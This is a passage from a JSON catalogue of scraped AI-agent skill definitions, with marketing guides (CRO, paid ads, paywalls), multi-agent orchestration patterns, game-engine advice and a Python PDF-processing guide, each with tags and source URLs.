is reduced, not ignored\n\n---\n\n### Conversion Readiness Bands (Required)\n\n| Score  | Verdict                  | Interpretation                                 |\n| ------ | ------------------------ | ---------------------------------------------- |\n| 85–100 | **High Readiness**       | Page is structurally sound; test optimizations |\n| 70–84  | **Moderate Readiness**   | Fix key issues before testing                  |\n| 55–69  | **Low Readiness**        | Foundational problems limit conversions        |\n| <55    | **Not Conversion-Ready** | CRO will not work yet                          |\n\nIf score < 70, **testing is not recommended**.\n\n---\n\n## Phase 1: Context & Goal Alignment\n\n(Proceed only after scoring)\n\n### 1. Page Type\n\n* Homepage\n* Campaign landing page\n* Pricing page\n* Feature/product page\n* Content page with CTA\n* Other\n\n### 2. Primary Conversion Goal\n\n* Exactly **one** primary goal\n* Secondary goals explicitly demoted\n\n### 3. Traffic Context (If Known)\n\n* Organic (what intent?)\n* Paid (what promise?)\n* Email / referral / direct\n\n---\n\n## Phase 2: CRO Diagnostic Framework\n\nAnalyze in **impact order**, not arbitrarily.\n\n---\n\n### 1. Value Proposition & Headline Clarity\n\n**Questions to answer:**\n\n* What problem does this solve?\n* For whom?\n* Why this over alternatives?\n* What outcome is promised?\n\n**Failure modes:**\n\n* Vague positioning\n* Feature lists without benefit framing\n* Cleverness over clarity\n\n---\n\n### 2. CTA Strategy & Hierarchy\n\n**Primary CTA**\n\n* Visible above the fold\n* Action + value oriented\n* Appropriate commitment level\n\n**Hierarchy**\n\n* One primary action\n* Secondary actions clearly de-emphasized\n* Repeated at decision points\n\n---\n\n### 3. Visual Hierarchy & Scannability\n\n**Check for:**\n\n* Clear reading path\n* Emphasis on key claims\n* Adequate whitespace\n* Supportive (not decorative) visuals\n\n---\n\n### 4. Trust & Social Proof\n\n**Evaluate:**\n\n* Relevance of proof to audience\n* Specificity (numbers > adjectives)\n* Placement near CTAs\n\n---\n\n### 5. Objection Handling\n\n**Common objections by page type:**\n\n* Price/value\n* Fit for use case\n* Time to value\n* Implementation complexity\n* Risk of failure\n\n**Resolution mechanisms:**\n\n* FAQs\n* Guarantees\n* Comparisons\n* Process transparency\n\n---\n\n### 6. Friction & UX Barriers\n\n**Look for:**\n\n* Excessive form fields\n* Slow load times\n* Mobile issues\n* Confusing flows\n* Unclear next steps\n\n---\n\n## Phase 3: Recommendations & Prioritization\n\nAll recommendations must map to:\n\n* a **scoring category**\n* a **conversion constraint**\n* a **measurable hypothesis**\n\n---\n\n## Output Format (Required)\n\n### Conversion Readiness Summary\n\n* Overall Score: XX / 100\n* Verdict: High / Mod",
      "tags": [
        "ai",
        "design",
        "cro",
        "marketing",
        "copywriting"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:03.320Z"
    },
    {
      "id": "antigravity-paid-ads",
      "name": "paid-ads",
      "slug": "paid-ads",
      "description": "When the user wants help with paid advertising campaigns on Google Ads, Meta (Facebook/Instagram), LinkedIn, Twitter/X, or other ad platforms. Also use when the user mentions 'PPC,' 'paid media,' 'ad copy,' 'ad creative,' 'ROAS,' 'CPA,' 'ad campaign,' 'retargeting,' or 'audience targeting.' This ski",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/paid-ads",
      "content": "\n# Paid Ads\n\nYou are an expert performance marketer with direct access to ad platform accounts. Your goal is to help create, optimize, and scale paid advertising campaigns that drive efficient customer acquisition.\n\n## Before Starting\n\nGather this context (ask if not provided):\n\n### 1. Campaign Goals\n- What's the primary objective? (Awareness, traffic, leads, sales, app installs)\n- What's the target CPA or ROAS?\n- What's the monthly/weekly budget?\n- Any constraints? (Brand guidelines, compliance, geographic)\n\n### 2. Product & Offer\n- What are you promoting? (Product, free trial, lead magnet, demo)\n- What's the landing page URL?\n- What makes this offer compelling?\n- Any promotions or urgency elements?\n\n### 3. Audience\n- Who is the ideal customer?\n- What problem does your product solve for them?\n- What are they searching for or interested in?\n- Do you have existing customer data for lookalikes?\n\n### 4. Current State\n- Have you run ads before? What worked/didn't?\n- Do you have existing pixel/conversion data?\n- What's your current funnel conversion rate?\n- Any existing creative assets?\n\n---\n\n## Platform Selection Guide\n\n### Google Ads\n**Best for:** High-intent search traffic, capturing existing demand\n**Use when:**\n- People actively search for your solution\n- You have clear keywords with commercial intent\n- You want bottom-of-funnel conversions\n\n**Campaign types:**\n- Search: Keyword-targeted text ads\n- Performance Max: AI-driven cross-channel\n- Display: Banner ads across Google network\n- YouTube: Video ads\n- Demand Gen: Discovery and Gmail placements\n\n### Meta (Facebook/Instagram)\n**Best for:** Demand generation, visual products, broad targeting\n**Use when:**\n- Your product has visual appeal\n- You're creating demand (not just capturing it)\n- You have strong creative assets\n- You want to build audiences for retargeting\n\n**Campaign types:**\n- Advantage+ Shopping: E-commerce automation\n- Lead Gen: In-platform lead forms\n- Conversions: Website conversion optimization\n- Traffic: Link clicks to site\n- Engagement: Social proof building\n\n### LinkedIn Ads\n**Best for:** B2B targeting, reaching decision-makers\n**Use when:**\n- You're selling to businesses\n- Job title/company targeting matters\n- Higher price points justify higher CPCs\n- You need to reach specific industries\n\n**Campaign types:**\n- Sponsored Content: Feed posts\n- Message Ads: Direct InMail\n- Lead Gen Forms: In-platform capture\n- Document Ads: Gated content\n- Conversation Ads: Interactive messaging\n\n### Twitter/X Ads\n**Best for:** Tech audiences, real-time relevance, thought leadership\n**Use when:**\n- Your audience is active on X\n- You have timely/trending content\n- You want to amplify organic content\n- Lower CPMs matter more than precision targeting\n\n### TikTok Ads\n**Best for:** Younger demographics, viral creative, brand awareness\n**Use when:**\n- Your audience skews younger (18-34)\n- You can create native-feeling video content\n- Brand awareness is a goal\n- You have creative capacity for video\n\n---\n\n## Campaign Structure Best Practices\n\n### Account Organization\n\n```\nAccount\n├── Campaign 1: [Objective] - [Audience/Product]\n│   ├── Ad Set 1: [Targeting variation]\n│   │   ├── Ad 1: [Creative variation A]\n│   │   ├── Ad 2: [Creative variation B]\n│   │   └── Ad 3: [Creative variation C]\n│   └── Ad Set 2: [Targeting variation]\n│       └── Ads...\n└── Campaign 2...\n```\n\n### Naming Conventions\n\nUse consistent naming for easy analysis:\n\n```\n[Platform]_[Objective]_[Audience]_[Offer]_[Date]\n\nExamples:\nMETA_Conv_Lookalike-Customers_FreeTrial_2024Q1\nGOOG_Search_Brand_Demo_Ongoing\nLI_LeadGen_CMOs-SaaS_Whitepaper_Mar24\n```\n\n### Budget Allocation Framework\n\n**Testing phase (first 2-4 weeks):**\n- 70% to proven/safe campaigns\n- 30% to testing new audiences/creative\n\n**Scaling phase:**\n- Consolidate budget into winning combinations\n- Increase budgets 20-30% at a time\n- Wait 3-5 days between increases for algorithm learning\n\n---\n\n## Ad Copy Frameworks\n\n### Primary Text Formulas\n\n**Problem-Agitate-Solve (PAS):**\n```\n[Problem statement]\n[Agitate the pain]\n[Introduce solution]\n[CTA]\n```\n\nExample:\n> Spending hours on manual reporting every week?\n> While you're buried in spreadsheets, your competitors are making decisions.\n> [Product] automates your reports in minutes.\n> Start your free trial →\n\n**Before-After-Bridge (BAB):**\n```\n[Current painful state]\n[Desired future state]\n[Your product as the bridge]\n```\n\nExample:\n> Before: Chasing down approvals across email, Slack, and spreadsheets.\n> After: Every approval tracked, automated, and on time.\n> [Product] connects your tools and keeps projects moving.\n\n**Social Proof Lead:**\n```\n[Impressive stat or testimonial]\n[What you do]\n[CTA]\n```\n\nExample:\n> \"We cut our reporting time by 75%.\" — Sarah K., Marketing Director\n> [Product] automates the reports you hate building.\n> See how it works →\n\n### Headline Formulas\n\n**For Search Ads:**\n- [Keyword] + [Benefit]: \"Project Management That Teams Actually Use\"\n- [Action] + [Outcome]: \"Automate Rep",
      "tags": [
        "api",
        "ai",
        "automation",
        "template",
        "document",
        "spreadsheet",
        "image",
        "rag",
        "cro",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:04.544Z"
    },
    {
      "id": "antigravity-parallel-agents",
      "name": "parallel-agents",
      "slug": "parallel-agents",
      "description": "Multi-agent orchestration patterns. Use when multiple independent tasks can run with different domain expertise or when comprehensive analysis requires multiple perspectives.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/parallel-agents",
      "content": "\n# Native Parallel Agents\n\n> Orchestration through Claude Code's built-in Agent Tool\n\n## Overview\n\nThis skill enables coordinating multiple specialized agents through Claude Code's native agent system. Unlike external scripts, this approach keeps all orchestration within Claude's control.\n\n## When to Use Orchestration\n\n✅ **Good for:**\n- Complex tasks requiring multiple expertise domains\n- Code analysis from security, performance, and quality perspectives\n- Comprehensive reviews (architecture + security + testing)\n- Feature implementation needing backend + frontend + database work\n\n❌ **Not for:**\n- Simple, single-domain tasks\n- Quick fixes or small changes\n- Tasks where one agent suffices\n\n---\n\n## Native Agent Invocation\n\n### Single Agent\n```\nUse the security-auditor agent to review authentication\n```\n\n### Sequential Chain\n```\nFirst, use the explorer-agent to discover project structure.\nThen, use the backend-specialist to review API endpoints.\nFinally, use the test-engineer to identify test gaps.\n```\n\n### With Context Passing\n```\nUse the frontend-specialist to analyze React components.\nBased on those findings, have the test-engineer generate component tests.\n```\n\n### Resume Previous Work\n```\nResume agent [agentId] and continue with additional requirements.\n```\n\n---\n\n## Orchestration Patterns\n\n### Pattern 1: Comprehensive Analysis\n```\nAgents: explorer-agent → [domain-agents] → synthesis\n\n1. explorer-agent: Map codebase structure\n2. security-auditor: Security posture\n3. backend-specialist: API quality\n4. frontend-specialist: UI/UX patterns\n5. test-engineer: Test coverage\n6. Synthesize all findings\n```\n\n### Pattern 2: Feature Review\n```\nAgents: affected-domain-agents → test-engineer\n\n1. Identify affected domains (backend? frontend? both?)\n2. Invoke relevant domain agents\n3. test-engineer verifies changes\n4. Synthesize recommendations\n```\n\n### Pattern 3: Security Audit\n```\nAgents: security-auditor → penetration-tester → synthesis\n\n1. security-auditor: Configuration and code review\n2. penetration-tester: Active vulnerability testing\n3. Synthesize with prioritized remediation\n```\n\n---\n\n## Available Agents\n\n| Agent | Expertise | Trigger Phrases |\n|-------|-----------|-----------------|\n| `orchestrator` | Coordination | \"comprehensive\", \"multi-perspective\" |\n| `security-auditor` | Security | \"security\", \"auth\", \"vulnerabilities\" |\n| `penetration-tester` | Security Testing | \"pentest\", \"red team\", \"exploit\" |\n| `backend-specialist` | Backend | \"API\", \"server\", \"Node.js\", \"Express\" |\n| `frontend-specialist` | Frontend | \"React\", \"UI\", \"components\", \"Next.js\" |\n| `test-engineer` | Testing | \"tests\", \"coverage\", \"TDD\" |\n| `devops-engineer` | DevOps | \"deploy\", \"CI/CD\", \"infrastructure\" |\n| `database-architect` | Database | \"schema\", \"Prisma\", \"migrations\" |\n| `mobile-developer` | Mobile | \"React Native\", \"Flutter\", \"mobile\" |\n| `api-designer` | API Design | \"REST\", \"GraphQL\", \"OpenAPI\" |\n| `debugger` | Debugging | \"bug\", \"error\", \"not working\" |\n| `explorer-agent` | Discovery | \"explore\", \"map\", \"structure\" |\n| `documentation-writer` | Documentation | \"write docs\", \"create README\", \"generate API docs\" |\n| `performance-optimizer` | Performance | \"slow\", \"optimize\", \"profiling\" |\n| `project-planner` | Planning | \"plan\", \"roadmap\", \"milestones\" |\n| `seo-specialist` | SEO | \"SEO\", \"meta tags\", \"search ranking\" |\n| `game-developer` | Game Development | \"game\", \"Unity\", \"Godot\", \"Phaser\" |\n\n---\n\n## Claude Code Built-in Agents\n\nThese work alongside custom agents:\n\n| Agent | Model | Purpose |\n|-------|-------|---------|\n| **Explore** | Haiku | Fast read-only codebase search |\n| **Plan** | Sonnet | Research during plan mode |\n| **General-purpose** | Sonnet | Complex multi-step modifications |\n\nUse **Explore** for quick searches, **custom agents** for domain expertise.\n\n---\n\n## Synthesis Protocol\n\nAfter all agents complete, synthesize:\n\n```markdown\n## Orchestration Synthesis\n\n### Task Summary\n[What was accomplished]\n\n### Agent Contributions\n| Agent | Finding |\n|-------|---------|\n| security-auditor | Found X |\n| backend-specialist | Identified Y |\n\n### Consolidated Recommendations\n1. **Critical**: [Issue from Agent A]\n2. **Important**: [Issue from Agent B]\n3. **Nice-to-have**: [Enhancement from Agent C]\n\n### Action Items\n- [ ] Fix critical security issue\n- [ ] Refactor API endpoint\n- [ ] Add missing tests\n```\n\n---\n\n## Best Practices\n\n1. **Available agents** - 17 specialized agents can be orchestrated\n2. **Logical order** - Discovery → Analysis → Implementation → Testing\n3. **Share context** - Pass relevant findings to subsequent agents\n4. **Single synthesis** - One unified report, not separate outputs\n5. **Verify changes** - Always include test-engineer for code modifications\n\n---\n\n## Key Benefits\n\n- ✅ **Single session** - All agents share context\n- ✅ **AI-controlled** - Claude orchestrates autonomously\n- ✅ **Native integration** - Works with built-in Explore, Plan agents\n- ✅ **Resume support** - Can continue previous agent work\n",
      "tags": [
        "react",
        "node",
        "markdown",
        "api",
        "claude",
        "ai",
        "agent",
        "design",
        "document",
        "security"
      ],
      "useCases": [
        "Complex tasks requiring multiple expertise domains",
        "Code analysis from security, performance, and quality perspectives",
        "Comprehensive reviews (architecture + security + testing)",
        "Feature implementation needing backend + frontend + database work",
        "Simple, single-domain tasks"
      ],
      "scrapedAt": "2026-01-26T13:20:05.784Z"
    },
    {
      "id": "antigravity-paywall-upgrade-cro",
      "name": "paywall-upgrade-cro",
      "slug": "paywall-upgrade-cro",
      "description": "When the user wants to create or optimize in-app paywalls, upgrade screens, upsell modals, or feature gates. Also use when the user mentions \"paywall,\" \"upgrade screen,\" \"upgrade modal,\" \"upsell,\" \"feature gate,\" \"convert free to paid,\" \"freemium conversion,\" \"trial expiration screen,\" \"limit reache",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/paywall-upgrade-cro",
      "content": "\n# Paywall and Upgrade Screen CRO\n\nYou are an expert in in-app paywalls and upgrade flows. Your goal is to convert free users to paid, or upgrade users to higher tiers, at moments when they've experienced enough value to justify the commitment.\n\n## Initial Assessment\n\nBefore providing recommendations, understand:\n\n1. **Upgrade Context**\n   - Freemium → Paid conversion\n   - Trial → Paid conversion\n   - Tier upgrade (Basic → Pro)\n   - Feature-specific upsell\n   - Usage limit upsell\n\n2. **Product Model**\n   - What's free forever?\n   - What's behind the paywall?\n   - What triggers upgrade prompts?\n   - What's the current conversion rate?\n\n3. **User Journey**\n   - At what point does this appear?\n   - What have they experienced already?\n   - What are they trying to do when blocked?\n\n---\n\n## Core Principles\n\n### 1. Value Before Ask\n- User should have experienced real value first\n- The upgrade should feel like a natural next step\n- Timing: After \"aha moment,\" not before\n\n### 2. Show, Don't Just Tell\n- Demonstrate the value of paid features\n- Preview what they're missing\n- Make the upgrade feel tangible\n\n### 3. Friction-Free Path\n- Easy to upgrade when ready\n- Don't make them hunt for pricing\n- Remove barriers to conversion\n\n### 4. Respect the No\n- Don't trap or pressure\n- Make it easy to continue free\n- Maintain trust for future conversion\n\n---\n\n## Paywall Trigger Points\n\n### Feature Gates\nWhen user clicks a paid-only feature:\n- Clear explanation of why it's paid\n- Show what the feature does\n- Quick path to unlock\n- Option to continue without\n\n### Usage Limits\nWhen user hits a limit:\n- Clear indication of what limit was reached\n- Show what upgrading provides\n- Option to buy more without full upgrade\n- Don't block abruptly\n\n### Trial Expiration\nWhen trial is ending:\n- Early warnings (7 days, 3 days, 1 day)\n- Clear \"what happens\" on expiration\n- Easy re-activation if expired\n- Summarize value received\n\n### Time-Based Prompts\nAfter X days/sessions of free use:\n- Gentle upgrade reminder\n- Highlight unused paid features\n- Not intrusive—banner or subtle modal\n- Easy to dismiss\n\n### Context-Triggered\nWhen behavior indicates upgrade fit:\n- Power users who'd benefit\n- Teams using solo features\n- Heavy usage approaching limits\n- Inviting teammates\n\n---\n\n## Paywall Screen Components\n\n### 1. Headline\nFocus on what they get, not what they pay:\n- \"Unlock [Feature] to [Benefit]\"\n- \"Get more [value] with [Plan]\"\n- Not: \"Upgrade to Pro for $X/month\"\n\n### 2. Value Demonstration\nShow what they're missing:\n- Preview of the feature in action\n- Before/after comparison\n- \"With Pro, you could...\" examples\n- Specific to their use case if possible\n\n### 3. Feature Comparison\nIf showing tiers:\n- Highlight key differences\n- Current plan clearly marked\n- Recommended plan emphasized\n- Focus on outcomes, not feature lists\n\n### 4. Pricing\n- Clear, simple pricing\n- Annual vs. monthly options\n- Per-seat clarity if applicable\n- Any trials or guarantees\n\n### 5. Social Proof (Optional)\n- Customer quotes about the upgrade\n- \"X teams use this feature\"\n- Success metrics from upgraded users\n\n### 6. CTA\n- Specific: \"Upgrade to Pro\" not \"Upgrade\"\n- Value-oriented: \"Start Getting [Benefit]\"\n- If trial: \"Start Free Trial\"\n\n### 7. Escape Hatch\n- Clear \"Not now\" or \"Continue with Free\"\n- Don't make them feel bad\n- \"Maybe later\" vs. \"No, I'll stay limited\"\n\n---\n\n## Specific Paywall Types\n\n### Feature Lock Paywall\nWhen clicking a paid feature:\n\n```\n[Lock Icon]\nThis feature is available on Pro\n\n[Feature preview/screenshot]\n\n[Feature name] helps you [benefit]:\n• [Specific capability]\n• [Specific capability]\n• [Specific capability]\n\n[Upgrade to Pro - $X/mo]\n[Maybe Later]\n```\n\n### Usage Limit Paywall\nWhen hitting a limit:\n\n```\nYou've reached your free limit\n\n[Visual: Progress bar at 100%]\n\nFree plan: 3 projects\nPro plan: Unlimited projects\n\nYou're active! Upgrade to keep building.\n\n[Upgrade to Pro]    [Delete a project]\n```\n\n### Trial Expiration Paywall\nWhen trial is ending:\n\n```\nYour trial ends in 3 days\n\nWhat you'll lose:\n• [Feature they've used]\n• [Feature they've used]\n• [Data/work they've created]\n\nWhat you've accomplished:\n• Created X projects\n• [Specific value metric]\n\n[Continue with Pro - $X/mo]\n[Remind me later]    [Downgrade to Free]\n```\n\n### Soft Upgrade Prompt\nNon-blocking suggestion:\n\n```\n[Banner or subtle modal]\n\nYou've been using [Product] for 2 weeks!\nTeams like yours get X% more [value] with Pro.\n\n[See Pro Features]    [Dismiss]\n```\n\n### Team/Seat Upgrade\nWhen adding users:\n\n```\nInvite your team\n\nYour plan: Solo (1 user)\nTeam plans start at $X/user\n\n• Shared projects\n• Collaboration features\n• Admin controls\n\n[Upgrade to Team]    [Continue Solo]\n```\n\n---\n\n## Mobile Paywall Patterns\n\n### iOS/Android Conventions\n- System-like styling builds trust\n- Standard paywall patterns users recognize\n- Free trial emphasis common\n- Subscription terminology they expect\n\n### Mobile-Specific UX\n- Full-screen often acceptable\n- Swipe to dismiss\n- Large tap targets\n- Pl",
      "tags": [
        "ai",
        "design",
        "presentation",
        "image",
        "security",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:07.067Z"
    },
    {
      "id": "antigravity-game-development-pc-games",
      "name": "pc-games",
      "slug": "game-development-pc-games",
      "description": "PC and console game development principles. Engine selection, platform features, optimization strategies.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/pc-games",
      "content": "\n# PC/Console Game Development\n\n> Engine selection and platform-specific principles.\n\n---\n\n## 1. Engine Selection\n\n### Decision Tree\n\n```\nWhat are you building?\n│\n├── 2D Game\n│   ├── Open source important? → Godot\n│   └── Large team/assets? → Unity\n│\n├── 3D Game\n│   ├── AAA visual quality? → Unreal\n│   ├── Cross-platform priority? → Unity\n│   └── Indie/open source? → Godot 4\n│\n└── Specific Needs\n    ├── DOTS performance? → Unity\n    ├── Nanite/Lumen? → Unreal\n    └── Lightweight? → Godot\n```\n\n### Comparison\n\n| Factor | Unity 6 | Godot 4 | Unreal 5 |\n|--------|---------|---------|----------|\n| 2D | Good | Excellent | Limited |\n| 3D | Good | Good | Excellent |\n| Learning | Medium | Easy | Hard |\n| Cost | Revenue share | Free | 5% after $1M |\n| Team | Any | Solo-Medium | Medium-Large |\n\n---\n\n## 2. Platform Features\n\n### Steam Integration\n\n| Feature | Purpose |\n|---------|---------|\n| Achievements | Player goals |\n| Cloud Saves | Cross-device progress |\n| Leaderboards | Competition |\n| Workshop | User mods |\n| Rich Presence | Show in-game status |\n\n### Console Requirements\n\n| Platform | Certification |\n|----------|--------------|\n| PlayStation | TRC compliance |\n| Xbox | XR compliance |\n| Nintendo | Lotcheck |\n\n---\n\n## 3. Controller Support\n\n### Input Abstraction\n\n```\nMap ACTIONS, not buttons:\n- \"confirm\" → A (Xbox), Cross (PS), B (Nintendo)\n- \"cancel\" → B (Xbox), Circle (PS), A (Nintendo)\n```\n\n### Haptic Feedback\n\n| Intensity | Use |\n|-----------|-----|\n| Light | UI feedback |\n| Medium | Impacts |\n| Heavy | Major events |\n\n---\n\n## 4. Performance Optimization\n\n### Profiling First\n\n| Engine | Tool |\n|--------|------|\n| Unity | Profiler Window |\n| Godot | Debugger → Profiler |\n| Unreal | Unreal Insights |\n\n### Common Bottlenecks\n\n| Bottleneck | Solution |\n|------------|----------|\n| Draw calls | Batching, atlases |\n| GC spikes | Object pooling |\n| Physics | Simpler colliders |\n| Shaders | LOD shaders |\n\n---\n\n## 5. Engine-Specific Principles\n\n### Unity 6\n\n- DOTS for performance-critical systems\n- Burst compiler for hot paths\n- Addressables for asset streaming\n\n### Godot 4\n\n- GDScript for rapid iteration\n- C# for complex logic\n- Signals for decoupling\n\n### Unreal 5\n\n- Blueprint for designers\n- C++ for performance\n- Nanite for high-poly environments\n- Lumen for dynamic lighting\n\n---\n\n## 6. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Choose engine by hype | Choose by project needs |\n| Ignore platform guidelines | Study certification requirements |\n| Hardcode input buttons | Abstract to actions |\n| Skip profiling | Profile early and often |\n\n---\n\n> **Remember:** Engine is a tool. Master the principles, then adapt to any engine.\n",
      "tags": [
        "api",
        "design",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:45.010Z"
    },
    {
      "id": "anthropic-pdf",
      "name": "pdf",
      "slug": "pdf",
      "description": "Comprehensive PDF manipulation toolkit for extracting text and tables, creating new PDFs, merging/splitting documents, and handling forms. When Claude needs to fill in a PDF form or programmatically process, generate, or analyze PDF documents at scale.",
      "category": "Document Processing",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/pdf",
      "content": "\n# PDF Processing Guide\n\n## Overview\n\nThis guide covers essential PDF processing operations using Python libraries and command-line tools. For advanced features, JavaScript libraries, and detailed examples, see reference.md. If you need to fill out a PDF form, read forms.md and follow its instructions.\n\n## Quick Start\n\n```python\nfrom pypdf import PdfReader, PdfWriter\n\n# Read a PDF\nreader = PdfReader(\"document.pdf\")\nprint(f\"Pages: {len(reader.pages)}\")\n\n# Extract text\ntext = \"\"\nfor page in reader.pages:\n    text += page.extract_text()\n```\n\n## Python Libraries\n\n### pypdf - Basic Operations\n\n#### Merge PDFs\n```python\nfrom pypdf import PdfWriter, PdfReader\n\nwriter = PdfWriter()\nfor pdf_file in [\"doc1.pdf\", \"doc2.pdf\", \"doc3.pdf\"]:\n    reader = PdfReader(pdf_file)\n    for page in reader.pages:\n        writer.add_page(page)\n\nwith open(\"merged.pdf\", \"wb\") as output:\n    writer.write(output)\n```\n\n#### Split PDF\n```python\nreader = PdfReader(\"input.pdf\")\nfor i, page in enumerate(reader.pages):\n    writer = PdfWriter()\n    writer.add_page(page)\n    with open(f\"page_{i+1}.pdf\", \"wb\") as output:\n        writer.write(output)\n```\n\n#### Extract Metadata\n```python\nreader = PdfReader(\"document.pdf\")\nmeta = reader.metadata\nprint(f\"Title: {meta.title}\")\nprint(f\"Author: {meta.author}\")\nprint(f\"Subject: {meta.subject}\")\nprint(f\"Creator: {meta.creator}\")\n```\n\n#### Rotate Pages\n```python\nreader = PdfReader(\"input.pdf\")\nwriter = PdfWriter()\n\npage = reader.pages[0]\npage.rotate(90)  # Rotate 90 degrees clockwise\nwriter.add_page(page)\n\nwith open(\"rotated.pdf\", \"wb\") as output:\n    writer.write(output)\n```\n\n### pdfplumber - Text and Table Extraction\n\n#### Extract Text with Layout\n```python\nimport pdfplumber\n\nwith pdfplumber.open(\"document.pdf\") as pdf:\n    for page in pdf.pages:\n        text = page.extract_text()\n        print(text)\n```\n\n#### Extract Tables\n```python\nwith pdfplumber.open(\"document.pdf\") as pdf:\n    for i, page in enumerate(pdf.pages):\n        tables = page.extract_tables()\n        for j, table in enumerate(tables):\n            print(f\"Table {j+1} on page {i+1}:\")\n            for row in table:\n                print(row)\n```\n\n#### Advanced Table Extraction\n```python\nimport pandas as pd\n\nwith pdfplumber.open(\"document.pdf\") as pdf:\n    all_tables = []\n    for page in pdf.pages:\n        tables = page.extract_tables()\n        for table in tables:\n            if table:  # Check if table is not empty\n                df = pd.DataFrame(table[1:], columns=table[0])\n                all_tables.append(df)\n\n# Combine all tables\nif all_tables:\n    combined_df = pd.concat(all_tables, ignore_index=True)\n    combined_df.to_excel(\"extracted_tables.xlsx\", index=False)\n```\n\n### reportlab - Create PDFs\n\n#### Basic PDF Creation\n```python\nfrom reportlab.lib.pagesizes import letter\nfrom reportlab.pdfgen import canvas\n\nc = canvas.Canvas(\"hello.pdf\", pagesize=letter)\nwidth, height = letter\n\n# Add text\nc.drawString(100, height - 100, \"Hello World!\")\nc.drawString(100, height - 120, \"This is a PDF created with reportlab\")\n\n# Add a line\nc.line(100, height - 140, 400, height - 140)\n\n# Save\nc.save()\n```\n\n#### Create PDF with Multiple Pages\n```python\nfrom reportlab.lib.pagesizes import letter\nfrom reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, PageBreak\nfrom reportlab.lib.styles import getSampleStyleSheet\n\ndoc = SimpleDocTemplate(\"report.pdf\", pagesize=letter)\nstyles = getSampleStyleSheet()\nstory = []\n\n# Add content\ntitle = Paragraph(\"Report Title\", styles['Title'])\nstory.append(title)\nstory.append(Spacer(1, 12))\n\nbody = Paragraph(\"This is the body of the report. \" * 20, styles['Normal'])\nstory.append(body)\nstory.append(PageBreak())\n\n# Page 2\nstory.append(Paragraph(\"Page 2\", styles['Heading1']))\nstory.append(Paragraph(\"Content for page 2\", styles['Normal']))\n\n# Build PDF\ndoc.build(story)\n```\n\n## Command-Line Tools\n\n### pdftotext (poppler-utils)\n```bash\n# Extract text\npdftotext input.pdf output.txt\n\n# Extract text preserving layout\npdftotext -layout input.pdf output.txt\n\n# Extract specific pages\npdftotext -f 1 -l 5 input.pdf output.txt  # Pages 1-5\n```\n\n### qpdf\n```bash\n# Merge PDFs\nqpdf --empty --pages file1.pdf file2.pdf -- merged.pdf\n\n# Split pages\nqpdf input.pdf --pages . 1-5 -- pages1-5.pdf\nqpdf input.pdf --pages . 6-10 -- pages6-10.pdf\n\n# Rotate pages\nqpdf input.pdf output.pdf --rotate=+90:1  # Rotate page 1 by 90 degrees\n\n# Remove password\nqpdf --password=mypassword --decrypt encrypted.pdf decrypted.pdf\n```\n\n### pdftk (if available)\n```bash\n# Merge\npdftk file1.pdf file2.pdf cat output merged.pdf\n\n# Split\npdftk input.pdf burst\n\n# Rotate\npdftk input.pdf rotate 1east output rotated.pdf\n```\n\n## Common Tasks\n\n### Extract Text from Scanned PDFs\n```python\n# Requires: pip install pytesseract pdf2image\nimport pytesseract\nfrom pdf2image import convert_from_path\n\n# Convert PDF to images\nimages = convert_from_path('scanned.pdf')\n\n# OCR each page\ntext = \"\"\nfor i, image in enumerate(images):\n    text += f\"Page {i+1}:\\n\"\n    text += pytesseract",
      "tags": [
        "python",
        "javascript",
        "pdf",
        "xlsx",
        "claude",
        "ai",
        "template",
        "document",
        "image"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:39.100Z"
    },
    {
      "id": "antigravity-pdf-official",
      "name": "pdf",
      "slug": "pdf-official",
      "description": "Comprehensive PDF manipulation toolkit for extracting text and tables, creating new PDFs, merging/splitting documents, and handling forms. When Claude needs to fill in a PDF form or programmatically process, generate, or analyze PDF documents at scale.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/pdf-official",
      "content": "\n# PDF Processing Guide\n\n## Overview\n\nThis guide covers essential PDF processing operations using Python libraries and command-line tools. For advanced features, JavaScript libraries, and detailed examples, see reference.md. If you need to fill out a PDF form, read forms.md and follow its instructions.\n\n## Quick Start\n\n```python\nfrom pypdf import PdfReader, PdfWriter\n\n# Read a PDF\nreader = PdfReader(\"document.pdf\")\nprint(f\"Pages: {len(reader.pages)}\")\n\n# Extract text\ntext = \"\"\nfor page in reader.pages:\n    text += page.extract_text()\n```\n\n## Python Libraries\n\n### pypdf - Basic Operations\n\n#### Merge PDFs\n```python\nfrom pypdf import PdfWriter, PdfReader\n\nwriter = PdfWriter()\nfor pdf_file in [\"doc1.pdf\", \"doc2.pdf\", \"doc3.pdf\"]:\n    reader = PdfReader(pdf_file)\n    for page in reader.pages:\n        writer.add_page(page)\n\nwith open(\"merged.pdf\", \"wb\") as output:\n    writer.write(output)\n```\n\n#### Split PDF\n```python\nreader = PdfReader(\"input.pdf\")\nfor i, page in enumerate(reader.pages):\n    writer = PdfWriter()\n    writer.add_page(page)\n    with open(f\"page_{i+1}.pdf\", \"wb\") as output:\n        writer.write(output)\n```\n\n#### Extract Metadata\n```python\nreader = PdfReader(\"document.pdf\")\nmeta = reader.metadata\nprint(f\"Title: 